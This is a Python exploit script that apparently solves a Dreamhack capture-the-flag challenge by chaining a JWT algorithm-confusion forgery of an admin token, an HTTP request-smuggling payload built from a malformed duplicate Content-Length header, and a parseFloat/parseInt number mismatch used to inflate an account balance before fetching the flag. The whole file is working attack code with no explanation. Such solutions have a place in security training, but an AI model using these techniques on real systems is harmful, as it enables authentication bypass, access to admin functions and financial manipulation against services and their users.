import requests
import socket
import json
from Crypto.PublicKey import RSA
import base64
import jwt

host, port = 'host8.dreamhack.games', 17013
url  = f"http://{host}:{port}"
s = requests.Session()

# jwt alg confusion
def get_pubkey(n, e):
    c = lambda v: int.from_bytes(base64.urlsafe_b64decode(v + '=='))

    key = RSA.construct((c(n), c(e)))

    return key.export_key(format='PEM').decode().replace("PUBLIC", 'RSA PUBLIC') + '\n'

res = s.get(f'{url}/jwks.json')
jwk = json.loads(res.content.decode())['keys'][0]

pubkey = get_pubkey(jwk['n'], jwk['e'])

token = jwt.encode(
    payload = {
        'role': 'admin'
    },
    key=pubkey,
    algorithm='HS256'
)

print("> Admin token:", token)

s.cookies.set('jwt', token)

# http request smuggling
def req_admin(endpoint):
    format = lambda d: b'\r\n'.join(d) + b'\r\n\r\n'

    body = [
        f'GET /admin{endpoint} HTTP/1.1'.encode(),
        f'Host: {host}'.encode(),
        f'Cookie: jwt={token}'.encode(),
    ]
    
    length = len(format(body))

    payload = [
        b"POST / HTTP/1.1",
        f"Host: {host}".encode(),
        f'Content-Length0{"a" * 255}:'.encode(),
        f"Content-Length: {length}".encode(),
        b"",
        *body
    ]

    payload = format(payload)

    s = socket.socket()
    s.connect((host, port))
    s.send(payload)

    resp = s.recv(4096)
    s.close()

    return resp.decode()

# parseFloat parseInt mismatch
print("> Setting balance")

req_admin(f'/withdraw?money=0.{'9' * 9}')
req_admin(f'/charge?money=0.{'9' * 17}')

# get flag
res = s.get(f"{url}/flag")
print("Flag:", res.text)